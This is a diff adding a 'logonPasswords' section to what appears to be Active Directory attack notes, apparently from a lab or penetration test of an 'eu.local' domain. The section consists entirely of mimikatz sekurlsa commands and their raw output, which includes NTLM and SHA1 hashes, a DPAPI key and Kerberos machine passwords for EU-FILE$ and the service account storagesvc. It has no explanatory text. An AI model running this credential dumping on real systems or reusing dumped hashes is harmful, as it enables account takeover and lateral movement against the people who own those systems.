@@ -550,3 +550,351 @@ SID               : S-1-5-21-3657428294-2017276338-1274645009-1106
 mimikatz #
 
 ```
+logonPasswords:
+
+```
+mimikatz # sekurlsa::
+ERROR mimikatz_doLocal ; "(null)" command of "sekurlsa" module not found !
+
+Module :        sekurlsa
+Full name :     SekurLSA module
+Description :   Some commands to enumerate credentials...
+
+             msv  -  Lists LM & NTLM credentials
+         wdigest  -  Lists WDigest credentials
+        kerberos  -  Lists Kerberos credentials
+           tspkg  -  Lists TsPkg credentials
+         livessp  -  Lists LiveSSP credentials
+         cloudap  -  Lists CloudAp credentials
+             ssp  -  Lists SSP credentials
+  logonPasswords  -  Lists all available providers credentials
+              lp  -  Lists all available providers credentials
+         process  -  Switch (or reinit) to LSASS process  context
+        minidump  -  Switch (or reinit) to LSASS minidump context
+         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
+             pth  -  Pass-the-hash
+         opassth  -  Pass-the-hash
+          krbtgt  -  krbtgt!
+     dpapisystem  -  DPAPI_SYSTEM secret
+           trust  -  Antisocial
+      backupkeys  -  Preferred Backup Master keys
+         tickets  -  List Kerberos tickets
+           ekeys  -  List Kerberos Encryption Keys
+            keys  -  List Kerberos Encryption Keys
+           dpapi  -  List Cached MasterKeys
+         credman  -  List Credentials Manager
+
+mimikatz # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 1747270 (00000000:001aa946)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 4:07:59 AM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : EU-FILE$
+         * Domain   : EU
+         * NTLM     : 419757d1b609d9f8e211092272631abd
+         * SHA1     : 0bc84f74a45db30eeb0c33488a882d65ee837462
+        tspkg :
+        wdigest :
+         * Username : EU-FILE$
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : EU-FILE$
+         * Domain   : eu.local
+         * Password : 14 85 35 de 36 a1 3b 10 a6 37 dc 07 4c 4b 4f 12 e6 71 e9 7e e9 79 e4 16 36 a6 04 57 68 aa 3f 78 41 7c a9 fa 5c c6 85 02 db e6 d0 8d 7f 5c 29 85 ed be d1 d3 62 5e 42 f8 3d 15 10 2b aa 9a f2 c5 48 2c 49 4b b0 a9 b3 3c 72 51 e5 83 00 f5 c9 fa 95 13 32 1e 16 50 3d be d3 27 1e 2d d3 2c 46 01 4d 46 ec 32 59 6f cf 64 68 02 d0 4e 92 b3 41 a1 f8 76 a2 1d c8 7e 77 b0 ba d9 83 0e 2f 59 67 61 7a 95 a1 4a 64 c3 9e 96 94 b6 a4 c6 a5 bf de 7b 76 cf 1e 42 bf 28 54 ae 33 b9 cb 0f 7b c6 d6 02 d2 1c 6d 2a a5 35 c6 37 79 ed b9 7d 29 b8 c1 ea 8f 18 9d 10 1c 5a 07 c3 74 db 60 76 bc 9d d7 a8 03 de 31 e6 e6 0b 47 7d 24 3e 84 60 12 6e 4a 68 aa d9 72 5a 24 4f 5a b6 df 1e de c9 19 78 c3 90 10 db 2d 34 15 74 7b 94 70 9f f4 80 5b 03 d8 b0
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1747163 (00000000:001aa8db)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 4:07:59 AM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : EU-FILE$
+         * Domain   : EU
+         * NTLM     : cb13975657590b7c342506e8e9d6ef39
+         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
+        tspkg :
+        wdigest :
+         * Username : EU-FILE$
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : EU-FILE$
+         * Domain   : eu.local
+         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 27753 (00000000:00006c69)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:38:34 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : EU-FILE$
+         * Domain   : EU
+         * NTLM     : cb13975657590b7c342506e8e9d6ef39
+         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1742331 (00000000:001a95fb)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 4:07:59 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : EU-FILE$
+         * Domain   : EU
+         * NTLM     : cb13975657590b7c342506e8e9d6ef39
+         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
+        tspkg :
+        wdigest :
+         * Username : EU-FILE$
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : EU-FILE$
+         * Domain   : eu.local
+         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 29244 (00000000:0000723c)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:38:34 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : EU-FILE$
+         * Domain   : EU
+         * NTLM     : cb13975657590b7c342506e8e9d6ef39
+         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
+        tspkg :
+        wdigest :
+         * Username : EU-FILE$
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : EU-FILE$
+         * Domain   : eu.local
+         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : EU-FILE$
+Domain            : EU
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:38:34 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : EU-FILE$
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : eu-file$
+         * Domain   : EU.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 49179 (00000000:0000c01b)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:38:35 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : EU-FILE$
+         * Domain   : EU
+         * NTLM     : 419757d1b609d9f8e211092272631abd
+         * SHA1     : 0bc84f74a45db30eeb0c33488a882d65ee837462
+        tspkg :
+        wdigest :
+         * Username : EU-FILE$
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : EU-FILE$
+         * Domain   : eu.local
+         * Password : 14 85 35 de 36 a1 3b 10 a6 37 dc 07 4c 4b 4f 12 e6 71 e9 7e e9 79 e4 16 36 a6 04 57 68 aa 3f 78 41 7c a9 fa 5c c6 85 02 db e6 d0 8d 7f 5c 29 85 ed be d1 d3 62 5e 42 f8 3d 15 10 2b aa 9a f2 c5 48 2c 49 4b b0 a9 b3 3c 72 51 e5 83 00 f5 c9 fa 95 13 32 1e 16 50 3d be d3 27 1e 2d d3 2c 46 01 4d 46 ec 32 59 6f cf 64 68 02 d0 4e 92 b3 41 a1 f8 76 a2 1d c8 7e 77 b0 ba d9 83 0e 2f 59 67 61 7a 95 a1 4a 64 c3 9e 96 94 b6 a4 c6 a5 bf de 7b 76 cf 1e 42 bf 28 54 ae 33 b9 cb 0f 7b c6 d6 02 d2 1c 6d 2a a5 35 c6 37 79 ed b9 7d 29 b8 c1 ea 8f 18 9d 10 1c 5a 07 c3 74 db 60 76 bc 9d d7 a8 03 de 31 e6 e6 0b 47 7d 24 3e 84 60 12 6e 4a 68 aa d9 72 5a 24 4f 5a b6 df 1e de c9 19 78 c3 90 10 db 2d 34 15 74 7b 94 70 9f f4 80 5b 03 d8 b0
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 49136 (00000000:0000bff0)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:38:35 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : EU-FILE$
+         * Domain   : EU
+         * NTLM     : cb13975657590b7c342506e8e9d6ef39
+         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
+        tspkg :
+        wdigest :
+         * Username : EU-FILE$
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : EU-FILE$
+         * Domain   : eu.local
+         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : EU-FILE$
+Domain            : EU
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:38:35 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : EU-FILE$
+         * Domain   : EU
+         * NTLM     : cb13975657590b7c342506e8e9d6ef39
+         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
+        tspkg :
+        wdigest :
+         * Username : EU-FILE$
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : eu-file$
+         * Domain   : EU.LOCAL
+         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 29265 (00000000:00007251)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:38:34 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : EU-FILE$
+         * Domain   : EU
+         * NTLM     : cb13975657590b7c342506e8e9d6ef39
+         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
+        tspkg :
+        wdigest :
+         * Username : EU-FILE$
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : EU-FILE$
+         * Domain   : eu.local
+         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1876451 (00000000:001ca1e3)
+Session           : RemoteInteractive from 2
+User Name         : storagesvc
+Domain            : EU
+Logon Server      : EU-DC
+Logon Time        : 12/26/2022 4:17:30 AM
+SID               : S-1-5-21-3657428294-2017276338-1274645009-1106
+        msv :
+         [00000003] Primary
+         * Username : storagesvc
+         * Domain   : EU
+         * NTLM     : 5c76877a9c454cded58807c20c20aeac
+         * SHA1     : d162b0c23116ab6fd94c9066f08a8de3ebd433a1
+         * DPAPI    : 613fc892fe0d9370e2590c4c8c7d4c6e
+        tspkg :
+        wdigest :
+         * Username : storagesvc
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : storagesvc
+         * Domain   : EU.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1876056 (00000000:001ca058)
+Session           : RemoteInteractive from 2
+User Name         : storagesvc
+Domain            : EU
+Logon Server      : EU-DC
+Logon Time        : 12/26/2022 4:17:30 AM
+SID               : S-1-5-21-3657428294-2017276338-1274645009-1106
+        msv :
+         [00000003] Primary
+         * Username : storagesvc
+         * Domain   : EU
+         * NTLM     : 5c76877a9c454cded58807c20c20aeac
+         * SHA1     : d162b0c23116ab6fd94c9066f08a8de3ebd433a1
+         * DPAPI    : 613fc892fe0d9370e2590c4c8c7d4c6e
+        tspkg :
+        wdigest :
+         * Username : storagesvc
+         * Domain   : EU
+         * Password : (null)
+        kerberos :
+         * Username : storagesvc
+         * Domain   : EU.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:38:35 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+```
